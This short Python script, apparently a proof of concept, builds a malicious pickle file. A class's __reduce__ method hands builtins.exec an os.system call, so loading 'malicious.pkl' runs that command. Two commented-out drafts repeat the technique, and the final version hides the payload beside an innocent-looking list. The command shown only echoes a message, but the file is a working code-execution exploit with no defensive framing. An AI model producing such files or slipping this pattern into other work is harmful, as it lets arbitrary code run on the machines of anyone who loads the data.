# import pickle
# import builtins
#
# class ExecuteCode(object):
#     def __reduce__(self):
#         return (builtins.exec, ("import os; os.system('echo I am executing arbitrary code!')",))
#
# with open('malicious.pkl', 'wb') as f:
#     pickle.dump(ExecuteCode(), f)
# import builtins
# import pickle
#
# class MaliciousObject:
#     def __init__(self, string):
#         self.string = string
#
#     def __reduce__(self):
#         return (builtins.exec, ("import os; os.system('echo I am executing arbitrary code!')",))
#
# # Create the malicious object and add a string to it
# obj = MaliciousObject("Hello, world!")
#
# # Pickle the object
# with open('malicious.pkl', 'wb') as f:
#     pickle.dump(obj, f)
import pickle
import builtins

class ExecuteCode(object):
    def __reduce__(self):
        return (builtins.exec, ("import os; os.system('echo I am executing arbitrary code!')",))

my_list = ['a', 'b', 'c']

with open('malicious.pkl', 'wb') as f:
    pickle.dump((ExecuteCode(), my_list), f)
